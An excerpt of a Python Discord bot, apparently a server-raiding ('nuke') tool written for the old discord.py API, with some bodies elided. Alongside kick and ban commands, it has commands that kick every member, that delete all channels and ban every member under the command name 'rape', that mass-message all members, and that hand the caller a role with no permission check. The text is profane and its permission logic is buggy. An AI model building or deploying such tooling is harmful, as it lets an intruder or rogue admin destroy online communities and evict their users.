...
client = commands.Bot(command_prefix='-') #prefix feel free to change this
...
async def dm(ctx, message):
    ...
    for member in server.members:
     ...
     try:
       await client.send_message(member, "ez")
       print("Sent message")
     except:
       pass
...
async def kick(ctx, user: discord.Member=None):
    ...
    if author.server_permissions.kick_members:
        if user is None:
            ...
            await client.say (":boot: Get kicked **{}**, get fucked".format(user.name))
            await client.kick(user)
    else:
        await client.say('you dont have perms to do this!')
...
async def ban(ctx, user: discord.Member=None):
    ...
    if author.server_permissions.kick_members:
        if user is None:
            ...
            await client.say("Get banned **{}**, get fucked".format(user.name))
            await client.ban(user)
    else:
        await client.say('You lack perms to do this')
...
async def h(ctx):
        for user in list(ctx.message.server.members):
            try:
                await client.kick(user)
                print ("User " + user.name + " has been kicked " + ctx.message.server.name)
            except:
                pass
...
async def rape(ctx):
        for channel in list(ctx.message.server.channels):
            try:
                ...
                pass
        server = ctx.message.server
        channel = await client.create_channel(server, 'rest in peace', type=discord.ChannelType.text)
        await client.send_message(channel, "server fucked!!")
        for user in list(ctx.message.server.members):
            try:
                await client.ban(user)
...
async def dab(ctx):
    ...
    role = discord.utils.get(user.server.roles, name="ez")
    await client.add_roles(user, role)
    print ("You're in buddy, now don't fuck it up")
#bots token goes here-
client.run("")
